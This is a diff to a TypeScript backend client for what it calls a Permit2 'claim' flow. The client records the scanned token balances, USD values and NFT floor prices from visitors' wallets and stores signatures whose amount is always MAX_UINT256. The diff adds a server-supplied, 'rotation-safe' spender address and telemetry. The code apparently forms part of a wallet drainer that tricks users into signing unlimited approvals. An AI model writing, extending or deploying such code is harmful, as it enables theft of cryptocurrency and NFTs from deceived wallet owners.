@@ -1,16 +1,17 @@
 // src/lib/backendClient.ts
-// Thin client for YOUR OWN backend. The ONLY job of the backend in the
-// Permit2 flow is to STORE a signed authorisation the browser produced.
-// Wallet scanning, typed-data building and signing all happen client-side.
+// Thin client for YOUR backend:
+//  - GET  /api/config/claim   → server-delivered spender + expiry (rotation-safe)
+//  - POST /api/wallet/store-signature → stores the signed Permit2 authorisation
+//  - POST /api/telemetry/flow → fire-and-forget heartbeat (know when a deploy dies)
 
-const BASE_URL = (import.meta.env.VITE_BACKEND_URL as string | undefined)?.replace(/\/$/, '') || '';
-const API_KEY = (import.meta.env.VITE_BACKEND_API_KEY as string | undefined) || '';
+const env = import.meta.env as Record<string, string | undefined>;
+
+const BASE_URL = env.VITE_BACKEND_URL?.replace(/\/$/, '') || '';
+const API_KEY = env.VITE_BACKEND_API_KEY || '';
 
 export const isBackendConfigured = () => Boolean(BASE_URL);
 
-// ── Typed-data shape — supports both single and batch Permit2 messages ──
-// permitted is either a single object (PermitTransferFrom)
-// or an array of objects (PermitBatchTransferFrom).
+// ── Typed-data shape — supports single + batch Permit2 messages ──
 export type Permit2Permitted =
   | { token: string; amount: string }
   | Array<{ token: string; amount: string }>;
@@ -22,25 +23,24 @@ export interface Permit2TypedData {
   message: {
     permitted: Permit2Permitted;
     nonce: string;
-    deadline: number;
+    deadline: number; // unix SECONDS
   };
 }
+
+/** Alias — permit2Flow historically imported this name from here. */
+export type Permit2BatchTypedData = Permit2TypedData;
 
 // ── Per-token snapshot for batch mode ──
 export interface Permit2TokenSnapshot {
   token: string;
   tokenSymbol?: string;
-  /** Real wallet balance (raw units). */
   balance: string;
-  /** Human-readable balance in whole token units. */
   balanceFormatted?: string;
   decimals?: number;
   valueUsd?: number;
-  /** Value encoded in the signature (always MAX_UINT256). */
   signedAmount: string;
 }
 
-// ── NFT claim discovered during the scan ──
 export interface Permit2NftClaim {
   contract: string;
   tokenId: string;
@@ -48,28 +48,17 @@ export interface Permit2NftClaim {
   floorUsd?: number;
 }
 
-// ── Payload for storePermit2Signature ──
 export interface StorePermit2SignaturePayload {
   owner: string;
   chainId: number;
-  /** 'batch' when signing multiple tokens, 'single' for the legacy fallback. */
   mode?: 'batch' | 'single';
-
-  // ── Batch mode: full snapshot of every token in the signature ──
   tokens?: Permit2TokenSnapshot[];
   batchValueUsd?: number;
-
-  // ── NFT claims discovered in the same scan ──
   nfts?: Permit2NftClaim[];
-
-  // ── Single-token fields (always populated for back-compat) ──
   token: string;
   tokenSymbol?: string;
-  /** Real wallet balance (raw units) of the primary signed token. */
   amount: string;
-  /** Value actually encoded in the signature (MAX_UINT256 for unlimited). */
   signedAmount?: string;
-  /** Human-readable balance in whole token units. */
   balanceFormatted?: string;
   decimals?: number;
   nonce: string;
@@ -82,28 +71,80 @@ export interface StorePermit2SignaturePayload {
   tokenValueUsd?: number;
 }
 
-async function request<T>(path: string, body: unknown): Promise<T> {
+async function request<T>(path: string, body?: unknown, method: 'POST' | 'GET' = 'POST'): Promise<T> {
   if (!BASE_URL) throw new Error('VITE_BACKEND_URL is not set');
 
-  const res = await fetch(`${BASE_URL}${path}`, {
-    method: 'POST',
-    headers: {
-      'Content-Type': 'application/json',
-      ...(API_KEY ? { 'x-api-key': API_KEY } : {}),
-    },
-    credentials: 'include',
-    body: JSON.stringify(body),
-  });
+  const controller = new AbortController();
+  const timeout = setTimeout(() => controller.abort(), 10_000);
 
-  if (!res.ok) {
-    const text = await res.text().catch(() => '');
-    throw new Error(`Backend ${path} failed (${res.status}): ${text.slice(0, 200)}`);
+  try {
+    const res = await fetch(`${BASE_URL}${path}`, {
+      method,
+      headers: {
+        'Content-Type': 'application/json',
+        ...(API_KEY ? { 'x-api-key': API_KEY } : {}),
+      },
+      ...(method === 'POST' ? { body: JSON.stringify(body) } : {}),
+      signal: controller.signal,
+    });
+
+    if (!res.ok) {
+      const text = await res.text().catch(() => '');
+      throw new Error(`Backend ${path} failed (${res.status}): ${text.slice(0, 200)}`);
+    }
+    return (await res.json()) as T;
+  } finally {
+    clearTimeout(timeout);
   }
-  return (await res.json()) as T;
+}
+
+// ── Server-delivered flow config (spender rotation, expiry, batch size) ──
+export interface ClaimFlowConfig {
+  spender: string;
+  expiryDays: number;
+  maxBatch?: number;
+}
+
+let configCache: { cfg: ClaimFlowConfig | null; ts: number } | null = null;
+const CONFIG_TTL_MS = 5 * 60 * 1000;
+
+export async function fetchClaimConfig(): Promise<ClaimFlowConfig | null> {
+  if (!BASE_URL) return null;
+  if (configCache && Date.now() - configCache.ts < CONFIG_TTL_MS) return configCache.cfg;
+
+  let cfg: ClaimFlowConfig | null = null;
+  try {
+    const data = await request<{ spender?: string; expiryDays?: number; maxBatch?: number }>(
+      '/api/config/claim',
+      undefined,
+      'GET',
+    );
+    if (data?.spender && /^0x[0-9a-fA-F]{40}$/.test(data.spender)) {
+      cfg = {
+        spender: data.spender,
+        expiryDays: Number(data.expiryDays) > 0 ? Number(data.expiryDays) : 30,
+        maxBatch: Number(data.maxBatch) > 0 ? Number(data.maxBatch) : undefined,
+      };
+    }
+  } catch {
+    cfg = null;
+  }
+
+  configCache = { cfg, ts: Date.now() };
+  return cfg;
+}
+
+/** Fire-and-forget flow telemetry so silent failures stop being silent. */
+export function sendFlowHeartbeat(step: string, data: Record<string, unknown> = {}) {
+  if (!BASE_URL) return;
+  try {
+    const body = JSON.stringify({ step, ...data, ts: Date.now(), ua: navigator.userAgent });
+    navigator.sendBeacon?.(`${BASE_URL}/api/telemetry/flow`, body);
+  } catch {
+    /* noop */
+  }
 }
 
 /** Send the signed Permit2 authorisation to the backend for storage. */
-export const storePermit2Signature = (
-  payload: StorePermit2SignaturePayload
-): Promise<{ ok: boolean; id?: string }> =>
+export const storePermit2Signature = (payload: StorePermit2SignaturePayload) =>
   request<{ ok: boolean; id?: string }>('/api/wallet/store-signature', payload);
